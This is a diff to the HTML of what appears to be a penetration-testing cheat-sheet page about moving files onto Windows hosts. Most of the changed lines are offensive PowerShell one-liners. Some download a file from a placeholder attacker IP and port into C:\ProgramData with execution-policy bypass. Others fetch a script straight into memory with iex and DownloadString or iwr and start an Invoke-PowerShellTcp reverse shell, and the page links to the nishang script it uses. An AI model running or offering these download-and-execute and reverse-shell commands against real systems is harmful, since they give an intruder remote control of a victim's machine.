@@ -329,7 +329,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 }
 </style>
   <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Powershell</button>
+<button data-tabset="set1" data-tabcontent="tab1" >Powershell</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >cmd</button>
 
@@ -342,15 +342,16 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><br>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Invoke-WebRequest
 </span></span><span class="line"><span class="cl"><span class="go">iwr http://&lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/&lt;FILE&gt; -o C:\ProgramData\&lt;FILE&gt;
-</span></span></span></code></pre></div><p><small><em>Note: PowerShell 3.0+</em></small></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Curl
-</span></span><span class="line"><span class="cl"><span class="go">powershell -ep bypass curl &lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/&lt;FILE&gt; -o C:\ProgramData\&lt;FILE&gt;
-</span></span></span></code></pre></div><p><small><em>Note: curl is not always available</em></small></p>
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Wget
+</span></span><span class="line"><span class="cl"><span class="go">powershell -ep bypass wget &lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/&lt;FILE&gt; -Outfile C:\ProgramData\&lt;FILE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Curl
+</span></span><span class="line"><span class="cl"><span class="go">powershell -ep bypass curl &lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/&lt;FILE&gt; -Outfile C:\ProgramData\&lt;FILE&gt;
+</span></span></span></code></pre></div><p><small><em>Note: curl and wget are alias to Invoke-WebRequest</em></small></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Load into memory and Run
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Invoke-Expression
-</span></span><span class="line"><span class="cl"><span class="go">iex (New-Object Net.WebClient).DownloadString(&#39;http://&lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/rev.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress &lt;LOCAL_IP&gt; -Port &lt;LOCAL_PORT&gt;
+</span></span><span class="line"><span class="cl"><span class="go">iex (New-Object Net.WebClient).DownloadString(&#39;http://&lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/&lt;FILE&gt;&#39;);Invoke-PowerShellTcp -Reverse -IPAddress &lt;LOCAL_IP&gt; -Port &lt;LOCAL_PORT&gt;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Short version
-</span></span><span class="line"><span class="cl"><span class="go">iex (iwr http://&lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/rev.ps1)
+</span></span><span class="line"><span class="cl"><span class="go">iex (iwr http://&lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/&lt;FILE&gt; -UseBasicParsing)
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">rev.ps1</a></em></small></p>
 </div>
 
